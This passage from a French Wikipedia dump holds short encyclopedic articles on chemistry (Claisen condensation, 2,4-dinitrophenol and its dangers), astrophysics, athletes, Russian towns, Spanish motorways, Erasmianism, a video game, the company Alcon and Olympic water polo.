 Mercredi 
 Dimanche 5 mars 
 Mardi 7 mars 
 Dimanche 12 mars 
 Jeudi 23 mars 
 Vendredi 31 mars 
Avril.
 Dimanche 9 avril 
 Dimanche 16 avril 
 Lundi 17 avril 
Mai.
 Mardi 2 mai 
 Dimanche 7 mai 
 Mercredi 17 mai 
Juin.
 Jeudi 
 Mardi 6 juin 
 Jeudi 8 juin 
 Dimanche 11 juin 
 Jeudi 15 juin 
 Mercredi 21 juin 
Juillet.
 Samedi 
 Mercredi 5 juillet 
 Jeudi 6 juillet 
Août.
 Mercredi 2 août 
Septembre.
 Dimanche 3 septembre 
 Lundi 11 septembre 
 Mardi 12 septembre 
 Vendredi 29 septembre 
Octobre.
 Mercredi 18 octobre 
 Dimanche 22 octobre 
 Vendredi 27 octobre 
Novembre.
 Jeudi 2 novembre 
 Mardi 7 novembre 
 Samedi 11 novembre 
 Vendredi 17 novembre 
 Lundi 20 novembre 
 Mardi 28 novembre 
Décembre.
 Dimanche 3 décembre 
André Ruffieux (Parti chrétien-social), André Chavanne (PSS) et François Peyrot (PLS) sont élus au Conseil d’État lors du de scrutin.
 Mercredi 6 décembre 
 Mardi 12 décembre 
 Vendredi 15 décembre 

</doc>
<doc id="2846340" url="https://fr.wikipedia.org/wiki?curid=2846340" title="Condensation de Claisen">
Condensation de Claisen

La condensation de Claisen (à ne pas confondre avec le réarrangement de Claisen) est une réaction omniprésente en milieu biologique. C'est une réaction formant une liaison carbone-carbone à partir de deux esters (ou deux thioesters par exemple) ou encore entre un ester et un composé carbonylé en présence d'une base forte, formant un β-cétoester ou une β-dicétone :
Elle est nommée d'après Ludwig Claisen qui a publié une étude sur cette réaction en 1881.
Prérequis.
Au moins l'un des réactifs doit être énolisable (c'est-à-dire disposer d'un atome d'hydrogène sur le carbone en alpha). En fonction de la nature énolisable ou non des réactifs, il existe différents types de condensation de Claisen.
La base ne doit pas non plus interférer par une réaction de substitution nucléophile ou d'addition nucléophile sur le carbone du groupe carbonyle. Pour cette raison, on utilise en général l'alcoolate conjuguée de l'alcool formé par la réaction (par exemple l'éthanolate de sodium si on forme de l'éthanol), ce qui permet en plus de régénérer l'alcoolate. Dans les condensations de Claisen « croisées », une base non-nucléophile telle que le diisopropylamidure de lithium (LDA) peut être utilisée, puisqu'un seul composé est énolisable. Le LDA ne peut par contre pas être utilisé pour les condensations « classiques » ou les condensations de Dieckmann, car tous les esters peuvent être convertis en énolate d'ester et la condensation ne peut alors avoir lieu.
La partie alcoolate de l'ester doit aussi être un bon groupe partant. On utilise pour ça des esters de méthyle ou d'éthyle, ce qui forme des groupes méthanolate ou éthanolate.
Types.
En fonction de la nature énolisable ou non des réactifs, il existe différents types de condensation de Claisen.
Dans la condensation de Claisen « classique », seul un ester énolisable est utilisé :
Dans la condensation de Claisen « croisée », on utilise un ester ou une cétone énolisable et un ester non énolisable :
Dans la condensation de Dieckmann, on utilise une molécule portant deux groupes esters qui réagissent intramoléculairement en formant un β-céto ester cyclique. Dans ce cas, le cycle formé doit contenir au moins 5 ou 6 atomes afin de respecter la tension de cycle :
Biologie.
On retrouve notamment la condensation de Claisen lors de la première étape de la cétogenèse lors de la condensation de deux acétyl-CoA en acétoacétyl-CoA.
On la retrouve également lors de la synthèse des acides gras à partir de malonyl-CoA qui va alors être redistribué par l'acide gras synthase pour mener à l'élongation des acides gras en cours de formation.
Variante.
La condensation de Stobbe est une variante de la condensation de Claisen, qui utilise un diester succinique à la place de l'ester, et se condense sur un composé carbonylé pour former un ester α,β-insaturé. Du fait de la plus grande stabilisation du carbanion succinique, une base moins forte que celle utilisée dans la condensation de Claisen peut généralement être utilisée. La réaction présente l'intérêt de fonctionner avec un grand nombre de substituants alkyles ou aryles, y compris de substituants encombrants.

</doc>
<doc id="2846341" url="https://fr.wikipedia.org/wiki?curid=2846341" title="Sergio Laganà">
Sergio Laganà

Sergio Laganà (né le à Reggio de Calabre) est un coureur cycliste italien, professionnel depuis 2006, membre, de 2011 à 2012 de l'équipe De Rosa-Ceramica Flaminia.
Biographie.
Sergio Laganà passe professionnel en 2007 dans l'équipe Tenax. Il court ensuite sous les couleurs des équipes LPR Brakes puis De Rosa-Stac Plastic en 2010.
Ses spécialités sont les montées ainsi que les courses de longue distance.

</doc>
<doc id="2846342" url="https://fr.wikipedia.org/wiki?curid=2846342" title="Elisabeth Högberg">
Elisabeth Högberg

Elisabeth Birgitta Högberg, née le à Jädraås, est une biathlète suédoise.
Carrière.
Après des débuts en junior en 2005, "Bettan" Högberg commence sa carrière en Coupe du monde en , puis obtient son premier podium le mois suivant dans un relais à Hochfilzen. En , elle gagne avec ses coéquipières le relais de Ruhpolding. Le mois suivant, elle participe aux Jeux olympiques de Vancouver, où après avoir seulement disputé l'individuel elle obtient la cinquième place sur le relais avec l'équipe de Suède. Au début de la saison 2014-2015, elle signe son premier "top 10" individuel en Coupe du monde en se classant huitième de l'individuel d'Östersund.
Elle prend part à ses deuxièmes jeux olympiques en 2018 à Pyeongchang, où elle se classe du sprint et de la poursuite.
En 2018-2019, elle obtient son meilleur classement général dans la Coupe du monde avec le rang.
L'hiver suivant, elle effectue la majeure partie de la saison sur le circuit inférieur de l'IBU Cup. Elle y remporte six victoires, dont le titre de championne d'Europe du sprint à Minsk, et gagne le classement général de l'IBU Cup 2019-2020.
La saison 2021-2022, au cours de laquelle elle n'a pas une seule fois la possibilité de participer à la Coupe du monde, est la dernière de sa carrière. Elle s'illustre cependant encore une fois en IBU Cup, remportant sa dernière victoire en décembre 2021 à Obertilliach (individuel) puis terminant à la troisième place du classement général après deux derniers podiums (sprint et relais mixte) lors de l'étape finale à Ridnaun en mars 2022.

</doc>
<doc id="2846345" url="https://fr.wikipedia.org/wiki?curid=2846345" title="Tchernogolovka">
Tchernogolovka

Tchernogolovka (en ) est une ville de l'oblast de Moscou, en Russie. Sa population s'élevait à habitants en 2014.
Géographie.
Tchernogolovka est située sur la rivière Tchernogolovka, sur la rive gauche de la Moskova, à au nord-est de Moscou.
Histoire.
Tchernogolovka est mentionné pour la première fois en 1710, mais un village nommé Tchernogolovl existait à cet emplacement depuis le . En 1956, Tchernogolovka se développa en une cité scientifique ("naoukograd") avec l'aide du lauréat du Prix Nobel Nikolaï Semionov, qui y démarra la branche expérimentale de l'Institut de physique chimique de Moscou. Elle devint dans les années 1970 un centre scientifique de l'Académie des sciences d'URSS. Tchernogolovka reçut le statut de commune urbaine en 1956, puis celui de ville en 2001 et enfin celui de cité scientifique en 2008.
Tchernogolovka est un centre scientifique majeur de la Russie, qui accueille plusieurs institutions de recherches de l'Académie des sciences de Russie, dont plusieurs instituts de physique : Institut de physique du solide (Институт физики твёрдого тела), Institut de physique théorique Landau (Институт теоретической физики им. Л. Д. Ландау).
Population.
Recensements (*) ou estimations de la population

</doc>
<doc id="2846346" url="https://fr.wikipedia.org/wiki?curid=2846346" title="Autoroute A-38 (Espagne)">
Autoroute A-38 (Espagne)

L'autoroute espagnole A-38 est une autoroute en projet qui reliera Valence à El Verger dans la Communauté valencienne. 
L'autoroute A-38 va doubler la N-332 surchargée durant la période estivale pour desservir toutes les stations balnéaires au sud de la Costa del Azahar. 
Elle va donc permettre de décharger l'AP-7 et la N-332 de leur circulation intense durant l'été.

</doc>
<doc id="2846350" url="https://fr.wikipedia.org/wiki?curid=2846350" title="A-38">
A-38



</doc>
<doc id="2846356" url="https://fr.wikipedia.org/wiki?curid=2846356" title="Fusion du néon">
Fusion du néon

En astrophysique, la fusion du néon (aussi anciennement désignée par « combustion du néon ») désigne un ensemble de réactions de fusion nucléaire qui ont lieu dans les étoiles d'au moins 8 masses solaires. Ces réactions se déroulent sur quelques années seulement et nécessitent des températures très élevées pour se produire, de l’ordre de .
Les principales réactions de fusion du néon sont :
Lorsque le néon du cœur de l'étoile a été entièrement transformé en atomes plus lourds, les réactions de fusion du néon cessent et la pression gravitationnelle n'est plus compensée par la pression de radiations, ce qui provoque la contraction du cœur de l'étoile jusqu'à atteindre un nouvel équilibre hydrostatique. La densité et la température du cœur augmentent sous l'effet de cette compression accrue, jusqu'à permettre l'amorçage des réactions de fusion de l'oxygène.

</doc>
<doc id="2846363" url="https://fr.wikipedia.org/wiki?curid=2846363" title="Bayard Poche">
Bayard Poche



</doc>
<doc id="2846368" url="https://fr.wikipedia.org/wiki?curid=2846368" title="Clément d'Ancyre">
Clément d'Ancyre

Clément d'Ancyre est un évêque d'Ancyre (Ankara), martyr sous Dioclétien (309 ?).
Notice historique.
Clément .
Détails tirés des Actes de son martyre.
Il est originaire de Galatie, en Asie Mineure. Il reste de longues années incarcéré avec plusieurs autres chrétiens ; il peut, toutefois, célébrer la sainte Messe. Un jour, pendant qu'il officie, ses bourreaux le décapitent. Fêté le 23 janvier.

</doc>
<doc id="2846370" url="https://fr.wikipedia.org/wiki?curid=2846370" title="Érasmisme">
Érasmisme

L'érasmisme est un courant idéologique, esthétique et religieux humaniste rattaché au mouvement de la Renaissance et centré sur les idées du Néerlandais Érasme (1466-1536).
Idéologie.
Œcuméniste, l'érasmisme défend un compromis entre le protestantisme et la papauté, bien que lorsqu'il fut contraint à faire un choix, Érasme s'inclinât vers cette dernière. Il critique la corruption du clergé, spécialement celle du clergé régulier, la piété superstitieuse, et les aspects les plus extérieurs de la religiosité catholique (vénération des saints, des reliques, vente d'indulgences etc.), préférant une "religiosité intérieure" et spirituelle, basée sur la prière mentale et inspirée de la "Devotio moderna". Pacifiste, il se déclare contre toutes les guerres, particulièrement les guerres de religion. À travers le "paulinisme", il veut réinterpréter la théologie des "Lettres" de Saint Paul avec davantage de flexibilité. Il est partisan de l'existence d'un pouvoir politique temporel en Europe, qu'il identifie avec l'Empire, et un autre pouvoir spirituel fort représenté par le Pape, qui doit donc laisser le pouvoir temporel à d'autres.
Sur le plan rhétorique, Érasme était partisan de l’"imitation éclectique" plutôt que l’"imitation cicéronienne" : le meilleur style s'obtiendra en imitant le meilleur de chaque auteur latin, plutôt que d'en imiter un seul (Cicéron).
Diffusion.
Appuyé par l'empereur Charles Quint, l'érasmisme connut un grand retentissement dans toute l'Europe, jusqu'à ce que les tensions entre catholiques et protestants amènent un climat généralisé de suspicion à l'égard de tous les courants intellectuels et religieux qui appuyaient la réforme de l'Église et de la spiritualité.
Une date clef pour l'introduction de l'érasmisme en Espagne est celle de la traduction des œuvres d'Érasme en castillan à partir de 1516-1517. Son succès fut très rapide et un groupe de collaborateurs proches de l'Empereur défenseur de l'érasmisme se constitua, parmi lesquels se trouvaient les frères Juan et Alfonso de Valdés ainsi que quelques prestigieux humanistes ; finalement une grande partie d'entre eux dut s'exiler hors d'Espagne.
Grâce à l'Empereur, le mouvement fut tout d'abord débarrassé de la qualification d'hérésie en 1527, lorsque Charles Quint, poussé par l'Inquisition, convoqua une assemblée connue sous le nom de Conférence de Valladolid pour débattre à propos des idées érasmiennes.
Partisans.
Érasme eut de nombreux partisans en Europe, comme Thomas More ou Guillaume Budé, et tout particulièrement en Espagne, où la première œuvre traduite d'Érasme fut publiée en 1516. Érasme protégé par l'empereur Charles Quint, ses idées s'enracinèrent dans les secteurs de la société castillane les plus mécontents de la religiosité traditionnelle: judéoconvers et partisans d'origine converse comme l'helléniste Juan de Vergara ou les frères Valdés sus-cités. Il fut également ami de l'émigré humaniste valencien Juan Luis Vives (également d'origine judéoconverse), et exerça une forte influence sur des écrivains comme François Rabelais, Pero Mexía, Andrés Laguna ou Miguel de Cervantes, chez ce dernier à travers son maître, l'humaniste López de Hoyos. En Espagne, par exemple, les écrivains érasmistes parvinrent à constituer un authentique groupe de pression dans l'entourage de l'empereur Charles Quint, mais après le retrait de ce dernier dans le monastère de Yuste et le début du règne de son fils Philippe II, ils tombèrent en disgrâce et l'Inquisition poursuivit tout vestige de cette forme d'humanisme. Juan de Vergara fut emprisonné, Juan Luis Vives et les frères Valdés durent émigrer ailleurs en Europe.

</doc>
<doc id="2846372" url="https://fr.wikipedia.org/wiki?curid=2846372" title="Numéros de téléphone français en 0800">
Numéros de téléphone français en 0800



</doc>
<doc id="2846374" url="https://fr.wikipedia.org/wiki?curid=2846374" title="Erasmisme">
Erasmisme



</doc>
<doc id="2846375" url="https://fr.wikipedia.org/wiki?curid=2846375" title="Érasmiste">
Érasmiste



</doc>
<doc id="2846378" url="https://fr.wikipedia.org/wiki?curid=2846378" title="Juan Luís Vives">
Juan Luís Vives



</doc>
<doc id="2846381" url="https://fr.wikipedia.org/wiki?curid=2846381" title="Amidamaru">
Amidamaru



</doc>
<doc id="2846382" url="https://fr.wikipedia.org/wiki?curid=2846382" title="2,4-Dinitrophénol">
2,4-Dinitrophénol

Le 2,4-dinitrophénol (DNP) est un composé chimique aromatique de formule CHNO. C'est l'un de six isomères du .
C'est un poison du métabolisme cellulaire. Il découple la phosphorylation oxydative en transportant les protons à travers la membrane mitochondriale, ce qui conduit à une augmentation rapide de la consommation d’oxygène en parallèle d'une faible formation d’ATP.
Propriétés chimiques.
Le 2,4-dinitrophénol est un solide cristallin jaune, qui a une odeur douceâtre de moisi. Il est très volatil, il se sublime lorsqu'il est légèrement chauffé et dégage alors de la vapeur. Il est modérément soluble dans l'eau (ses sels de sodium sont des cristaux solubles dans l'eau), l’acétate d'éthyle, l’acétone, le chloroforme, la pyridine, le tétrachlorure de carbone, le toluène, l’éthanol, le benzène, et les solutions aqueuses alcalines. Il forme des sels explosifs avec les produits alcalins et l’ammoniaque, et émet des fumées toxiques d'oxydes d'azote quand il est chauffé jusqu'à décomposition. Il est incompatible avec les métaux lourds et de leurs composés.
Usages industriels.
Le 2,4-dinitrophénol est utilisé commercialement principalement dans la recherche scientifique et l'industrie manufacturière. Il a été utilisé à une époque pour fabriquer des colorants, d'autres produits utilisés en chimie organique et des produits de traitement des bois. Il a également été utilisé pour fabriquer des produits pour développer les photographies, des explosifs et des pesticides.
Utilisations dans la recherche.
Le dinitrophénol est également utilisé pour identifier les cétones. Le DNP se combine avec les cétones et le point de fusion du composé qui en résulte permet de déterminer de quelle cétone il s’agit.
Action pharmacologique.
Dans les cellules vivantes, le dinitrophénol agit comme un transporteur de protons (ionophores), un agent qui peut transporter les protons (ions hydrogène) à travers les membranes biologiques. Il contrarie le gradient des protons dans les mitochondries et les membranes des chloroplastes et provoque l'effondrement du gradient électrochimique que la cellule utilise pour produire l’énergie chimique de la plupart des molécules d’ATP. Au lieu de produire de l'ATP, l'énergie du gradient de protons est perdue en chaleur. Les cellules compensent la baisse du rendement de l'ATP en oxydant davantage les réserves stockées sous forme de glucides et de graisses.
Le dinitrophénol est souvent utilisé dans la recherche en biochimie pour explorer le fonctionnement de l’osmose chimique et des autres mécanismes protéiques de transport membranaire.
Toxicité pour l’environnement.
Le dinitrophénol est considéré comme un important contaminant de l’environnement par l’Agence de protection de l'environnement des États-Unis (EPA). Il a été retrouvé dans 61 des sites prioritaires qui ont besoin d’être dépollués de leurs déchets industriels. Il peut contaminer l'atmosphère à partir des gaz d'échappement des véhicules automobiles, de la combustion de certaines substances industrielles, et de la réaction de l'azote de l'air atmosphérique avec d'autres produits chimiques. Le site majeur de dégradation est le sol, où il est métabolisé par les micro-organismes.
Mais les effets du dinitrophénol sur les micro-organismes anaérobies sont encore mal connus. Certaines études suggèrent qu’il existerait une toxicité pour les organismes anaérobies à cause de la réduction de la production de méthane.
Toxicologie professionnelle.
En milieu professionnel, le 2,4-dinitrophénol est ingéré par voie respiratoire (poussières, vapeurs) et surtout par voie cutanée. Les effets d'une intoxication aiguë par voies dermale et inhalatoire n'ont pas fait l'objet d'études.
Utilisation comme traitement amaigrissant.
Au cours des années 1930, le dinitrophénol a été largement utilisé dans les pilules amaigrissantes, après que Cutting et Tainter de l'Université de Stanford eurent réalisé leur première étude sur la capacité des drogues à accroître considérablement leur activité métabolique. Le dinitrophénol agit comme transporteur de protons dans la membrane mitochondriale, en inhibant la phosphorylation oxydative de l'ATP et en rendant la production d'énergie moins efficace. En effet, une partie de l'énergie qui est normalement produite à partir de la respiration cellulaire est gaspillée en chaleur. Ce manque d'efficacité est proportionnel à la dose de dinitrophénol qui est absorbée. Ainsi, lorsque la dose augmente, la production d'énergie devient-elle moins efficace : le métabolisme est alors activé - un plus grand nombre de matières grasses sont brûlées -, afin de compenser l'inefficacité et de répondre à la demande énergétique. Fait intéressant, le facteur qui limite le plus l’augmentation des doses de dinitrophénol n'est pas le manque de production d'énergie par l'ATP, mais plutôt une hausse excessive de la température corporelle due à la chaleur produite. En conséquence, une surdose de dinitrophénol va provoquer une fièvre fatale. Les effets secondaires dangereux, et notamment les cataractes qui se sont développées, ont abouti rapidement à l’interdiction du dinitrophénol aux États-Unis dans le courant de l’année 1938. Le dinitrophénol continue cependant à être utilisé par certains culturistes et athlètes pour perdre rapidement de la graisse corporelle. Les surdoses fatales sont rares, mais elles sont toujours signalées occasionnellement. En 2007, une allemande est décédée après avoir ingéré du DNP.
Face à ces intoxications, dont une fatale au Royaume-Uni, Interpol publie en une alerte mondiale, une « notice orange », face à ce produit illicite, à l'usage potentiellement mortel. En Angleterre et au Pays de Galles seulement, entre 2007 et 2016, le dinitrophénol a été mentionné sur le certificat de décès comme étant impliqué dans 15 décès.
Alors que le dinitrophénol est considéré par beaucoup comme trop dangereux pour un usage humain, son mécanisme d'action reste l'objet d’étude comme approche d’un traitement potentiel de l'obésité. Actuellement, la recherche est axée sur les protéines inhibitrices présentes naturellement chez l'homme.

</doc>
<doc id="2846384" url="https://fr.wikipedia.org/wiki?curid=2846384" title="Water-polo aux Jeux olympiques d'été de 1936">
Water-polo aux Jeux olympiques d'été de 1936

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1936 à Berlin.

</doc>
<doc id="2846386" url="https://fr.wikipedia.org/wiki?curid=2846386" title="Slap Fight">
Slap Fight

 (aussi connu sous le nom A.L.C.O.N.) est un jeu vidéo de type "shoot them up" sorti en 1986 développé par Toaplan et édité par Taito sur borne d'arcade. Il fut ensuite édité par Ocean Software (Imagine) en 1987 sur Amstrad CPC, Atari ST, Commodore 64, Thomson Gamme MOTO et ZX Spectrum. Il a ensuite été réédité sous le titre Slap Fight MD sur Mega Drive par Tengen en 1993 (au Japon et en Corée du Sud uniquement).
Synopsis.
Prenant place en l'année 2059 dans une autre galaxie, l'humanité a colonisé une planète extraterrestre appelé Theon après avoir évacué la planète Orac déjà colonisée. Cinq ans auparavant, la colonie sur Orac a été attaquée par des envahisseurs extraterrestres et la guerre était si intense que les colons ont été forcés de la quitter. Théon est maintenant attaquée par la même flotte alien mais cette fois les humains sont prêts. Le joueur assume le rôle d'un pilote d'avion de combat "SW475 star fighter" au sein de "l'Allied League of Cosmic Nations (ALCON)" pour arrêter les envahisseurs.
Système de jeu.
La progression dans le jeu se fait en défilement vertical. Des petites étoiles doivent être ramassées et permettent d'acheter des options pour le vaisseau.

</doc>
<doc id="2846387" url="https://fr.wikipedia.org/wiki?curid=2846387" title="A.L.C.O.N.">
A.L.C.O.N.



</doc>
<doc id="2846388" url="https://fr.wikipedia.org/wiki?curid=2846388" title="Power Wing">
Power Wing



</doc>
<doc id="2846390" url="https://fr.wikipedia.org/wiki?curid=2846390" title="Alcon">
Alcon

Alcon est une entreprise suisse du secteur pharmaceutique, fondée à l'origine aux États-Unis.
Le siège social de l'entreprise est basé à Hünenberg dans le canton de Zoug en Suisse. "Alcon", qui appartenait auparavant au groupe Nestlé, a été racheté en 2008 par le groupe pharmaceutique Novartis. Les produits vendus sous la marque CIBA Vision (Novartis) le sont désormais sous celle d'Alcon.
Histoire.
L'entreprise a été fondée en 1945 à Fort Worth au Texas par Robert Alexander et William Conner. Le nom d'Alcon a été imaginé en associant les premières lettres de leurs patronymes.
Initialement simple pharmacie de production, l'entreprise proposait aux médecins locaux les produits dont ils avaient besoin et dont elle pouvait assurer la production. Rapidement, ils s'aperçurent qu'il y avait un besoin important de véritables potions ophtalmologiques et ils s'engouffrèrent dans cette spécialité avec beaucoup de succès.
En 1978, Alcon est vendue au groupe suisse Nestlé qui cherchait à s'investir dans des entreprises innovantes du secteur de la santé.
En 1979, Alcon a racheté la Texas Pharmacal Company qui est devenue Dermatological Products of Texas puis DPT Laboratories.
En 1984, Alcon a fondé un prix d'excellence technique afin de promouvoir des réalisations en recherche et développement. La gamme de produits Alcon s'est étendue des produits pharmaceutiques au domaine de la chirurgie. Aujourd'hui, Alcon est présent dans 75 pays et ses produits sont vendus dans plus de 180 pays.
En 2002, 23,2 % du capital est introduit en bourse. Nestlé a procédé à une première offre publique de 25% de ses parts dans Alcon en 2002. En juillet 2008, Novartis a acheté environ 25 % des parts de Nestlé, avec une option d'achat des actions restantes de Nestlé à partir de 2010. Novartis a acheté 52 % des parts de Nestlé pour de dollars. Cette opération a porté la participation totale de Novartis dans Alcon à 77%. À partir de janvier 2010, Novartis a annoncé poursuivre le rachat de part d'Alcon.
Le , le groupe Nestlé annonce la vente à Novartis de 77 % d'Alcon, leader mondial des produits ophtalmiques, pour d'euros — 24,85 % immédiatement pour d'euros et le complément d'ici 2011.
Le 29 mars 2010, Alcon a racheté Durezol et Zyclorin à Sirion Therapeutics. Le 28 juin 2010, le Comité Indépendant d'Alcon a annoncé qu'une recommandation du Comité était une première étape indispensable avant que le conseil d'administration de la société puisse décider de la proposition de fusion de Novartis AG, réfutant les implications de Novartis selon lesquelles elle serait en mesure d'imposer unilatéralement la fusion indépendamment de la position du Comité Indépendant d'Alcon une fois que Novartis serait devenue l'actionnaire majoritaire d'Alcon. Le 8 juillet 2010, le comité d'administrateurs indépendants d'Alcon avait mis en place un fonds de litige de de dollars pour s'assurer que les actionnaires minoritaires de la société obtiennent la meilleure offre de Novartis AG.
Le 9 avril 2019, Alcon a réalisé un spin-off à 100% de Novartis. La nouvelle société autonome vaut jusqu'à de francs suisses.
Controverses.
Alcon a suspendu tous ses investissements en Russie et interrompu le recrutement de chercheurs cliniques dans ce pays en avril 2022. Malgré cela, l'entreprise poursuit ses activités commerciales en Russie. Cette pause s'inscrit dans la tendance générale de l'industrie à réévaluer ses activités en réponse aux tensions géopolitiques.
Produits.
La production s'étend des soins de consommation courante aux produits pharmaceutiques en passant par les lentilles intra-oculaires et les médicaments pour les maladies ophtalmiques sévères.

</doc>
<doc id="2846391" url="https://fr.wikipedia.org/wiki?curid=2846391" title="Slap Fight MD">
Slap Fight MD



</doc>
<doc id="2846392" url="https://fr.wikipedia.org/wiki?curid=2846392" title="Torben Grut">
Torben Grut

Torben Andreas Grut (né le à dans le Västergötland en Suède et mort le à Frederiksberg au Danemark) est un architecte suédois.
Biographie.
Il fut considéré comme l'un des architectes phares de sa génération de 1903 jusqu'aux années 1920, période durant laquelle il travailla à Stockholm. Il est surtout connu pour avoir conçu des bâtiments de sport, notamment le Stade olympique de Stockholm ("Stockholm Stadion"), et différents édifices de prestige.
Sa famille était d'origine danoise. Son père, propriétaire foncier, possédait un domaine à Gammalstorp (commune de Lidköping).
Après ses études secondaires, Torben Grut étudia l'architecture à l'Institut royal de technologie ("Kungliga Tekniska högskolan" ou KTH) de Stockholm. Isak Gustaf Clason y enseignait, ce qui ne fut pas de peu d'importance dans les idées de Grut sur l'architecture. Pendant ses années d'étudiant, il fit entre autres la connaissance de Ferdinand Boberg. Après quatre années passées au KTH, il entra au service de l'architecte danois H. Holm.
On doit notamment à Torben Grut :

</doc>
<doc id="2846393" url="https://fr.wikipedia.org/wiki?curid=2846393" title="Water-polo aux Jeux olympiques d'été de 1932">
Water-polo aux Jeux olympiques d'été de 1932

L'équipe de Hongrie remporte son premier titre olympique de water-polo.
La sélection du Brésil est disqualifiée (et ses résultats annulés) après s'en être pris à l'arbitre, à la suite de leur défaite face aux États-Unis.

</doc>
<doc id="2846394" url="https://fr.wikipedia.org/wiki?curid=2846394" title="ABS">
ABS



</doc>
<doc id="2846398" url="https://fr.wikipedia.org/wiki?curid=2846398" title="Williams Field">
Williams Field

Williams Field ou Willies Field est « l'aéroport » de l'United States Antarctic Program et le principal terrain d'aviation dans l'Antarctique. L'aéroport est situé à environ au large de l'île de Ross et il dessert notamment les bases antarctiques McMurdo et Scott. En outre, Williams est le principal terrain d'aviation pour les opérations aériennes dans le continent Antarctique.
Williams Field a été nommé en l'honneur de Richard T. Williams, un technicien de l'United States Navy qui s'est noyé lorsque son tracteur bulldozer D-8 a troué la glace le . Williams et d'autres membres du personnel participaient à l'opération Deep Freeze, une mission militaire américaine de construction d'une station permanente de recherche en sciences (McMurdo Station) en prévision de l'Année géophysique internationale de 1957-1958.
La piste est habituellement utilisée de décembre à la fin février. Les autres aéroports, comme Ice Runway est utilisée d'octobre à décembre et Pegasus Field utilisé au mois d'août et de décembre jusqu'à février chaque saison.

</doc>
<doc id="2846399" url="https://fr.wikipedia.org/wiki?curid=2846399" title="Thomas Anderson (chimiste)">
Thomas Anderson (chimiste)

Thomas Anderson né le et mort le est un chimiste écossais, découvreur de la pyridine.
Biographie.
Né à Édimbourg, Anderson est formé à la Leith High school et à l'Académie d'Édimbourg avant d'entreprendre des études de médecine à l'université d'Édimbourg d'où il sort diplômé en 1841. Son intérêt pour la chimie le conduit à poursuivre plusieurs années durant des recherches en Europe, sous les observations de Jöns Jakob Berzelius et Justus von Liebig.
Anderson succède à Thomas Thomson comme professeur de chimie à l'université de Glasgow en 1852. L'année suivante, ses travaux sur les alcaloïdes ont fait de lui le découvreur de la structure de la codéine. Par la suite, il met au jour la pyridine et les composés tels que la picoline avec ses études sur la distillation de l'huile d'os et de matières animales.

</doc>
<doc id="2846403" url="https://fr.wikipedia.org/wiki?curid=2846403" title="Water-polo aux Jeux olympiques d'été de 1928">
Water-polo aux Jeux olympiques d'été de 1928

Résultats du tournoi olympique de water-polo aux Jeux olympiques d'été de 1928 à Amsterdam.
Équipes.
Équipe d'Allemagne.
Erich Rademacher, Fritz Gunst, Otto Cordes, Emil Benecke, Karl Bähre, Joachim “Aki” Rademacher, Max Amann, Johannes Blank.
Équipe de Hongrie.
István Barta, Sándor Ivády, Márton Homonnay, Alajos Keserű, Olivér Halassy, József Vértesy, Ferenc Keserű.
Équipe de France.
Paul Dujardin, Henri Padou, Jules Keignaert, Émile Bulteel, Achille Tribouillet, Henri Cuvelier, Albert Vandeplancke, Ernest Rogez, Albert Thévenon.

</doc>
<doc id="2846405" url="https://fr.wikipedia.org/wiki?curid=2846405" title="Autoroute A-81 (Espagne)">
Autoroute A-81 (Espagne)

L'autoroute A-81 est une autoroute espagnole en projet qui reliera Grenade à Badajoz dans l'Estrémadure. 
L'autoroute A-81 va doubler la N-432 pour desservir les différentes villes de son tracé. Actuellement pour relier ces villes par autoroute il faut faire un long détour par Séville.

</doc>
<doc id="2846406" url="https://fr.wikipedia.org/wiki?curid=2846406" title="A-81">
A-81



</doc>
<doc id="2846408" url="https://fr.wikipedia.org/wiki?curid=2846408" title="Bruno Zumino">
Bruno Zumino

Bruno Zumino (né le à Rome et décédé le ) est un physicien italien.
Professeur de physique théorique, il est connu pour ses contributions dans la théorie de jauge, et il a notamment proposé le , en collaboration avec Julius Wess, mais aussi l'une des premières théories de la supergravité avec Stanley Deser.
Biographie.
Bruno Zumino obtint son doctorat à l'université La Sapienza de Rome, et devint professeur à l'université de Berkeley en 1982. Il prit sa retraite en 1994.
En 1973, alors qu'il travaille au CERN, il développe avec Julius Wess (alors à l'université de Karlsruhe), la première théorie de supersymétrie.
Liens externes.
 
 

</doc>
<doc id="2846413" url="https://fr.wikipedia.org/wiki?curid=2846413" title="Sous-sol (film)">
Sous-sol (film)

Sous-sol est un film canadien réalisé par Pierre Gang, sorti en 1996.

</doc>
<doc id="2846414" url="https://fr.wikipedia.org/wiki?curid=2846414" title="Pouchtchino">
Pouchtchino

Pouchtchino (en ) est une ville de l'oblast de Moscou, en Russie. Sa population s'élevait à habitants en 2019.
Géographie.
Pouchtchino est située sur la rive droite de la rivière Oka, à au sud de Moscou. Elle s'est édifiée sur le plateau central de Russie, dont le point culminant (236 m) est voisin.
Histoire.
Pouchtchino existe depuis le comme une propriété de famille après qu'elle fut remise en récompense à la famille Pouchkine vers l'an 1500. La ville a été choisie en 1956 comme un site pour un centre de recherche scientifique de l'Académie des sciences de Russie. Elle a le statut de ville depuis 1966. Pour ne pas être confondue avec d'autres villes dont les noms sont proches, la ville est officieusement appelée Pouchtchino-sur-l'Oka.
Population.
Recensements (*) ou estimations de la population

</doc>
<doc id="2846415" url="https://fr.wikipedia.org/wiki?curid=2846415" title="Love (The Beatles)">
Love (The Beatles)



</doc>
<doc id="2846418" url="https://fr.wikipedia.org/wiki?curid=2846418" title="Star Cruiser">
Star Cruiser

Star Cruiser est un jeu de tir à la première personne avec des éléments de jeu de rôle, sorti en 1988 sur NEC PC-8801 puis porté notamment sur Mega Drive en 1990. Le jeu a été développé par Arsys Software et édité par Masaya. Il est sorti uniquement au Japon.
Système de jeu.
"Star Cruiser" est un jeu de tir à la première personne innovant qui introduit l'utilisation de graphismes en 3D polygonal et d'éléments de jeu de rôle.

</doc>
<doc id="2846423" url="https://fr.wikipedia.org/wiki?curid=2846423" title="Water-polo aux Jeux olympiques de 1920">
Water-polo aux Jeux olympiques de 1920

Le tournoi de water-polo aux Jeux olympiques d'été de 1920 ont lieu pendant les épreuves olympiques à Anvers, en Belgique.
Résultats.
Équipe de Grande-Bretagne.
Charles Bugbee, Charles Sydney Smith, William Peacock, Noel M. Purcell, William Henry Dean, Paul Radmilovic, Christopher Jones.
Équipe de Belgique.
Albert Durant, Gérard Blitz, Maurice Blitz, Joseph Pletincx, Paul Gailly, Pierre Nijs, René Bauwens, Pierre Dewin.
Équipe de Suède.
Erik Andersson, Harald Julin, Max Gumpel, Pontus Hansson, Robert Andersson, Vilhelm Andersson, Erik Bergqvist, Nils Backlund, Theodor Naumann.

</doc>
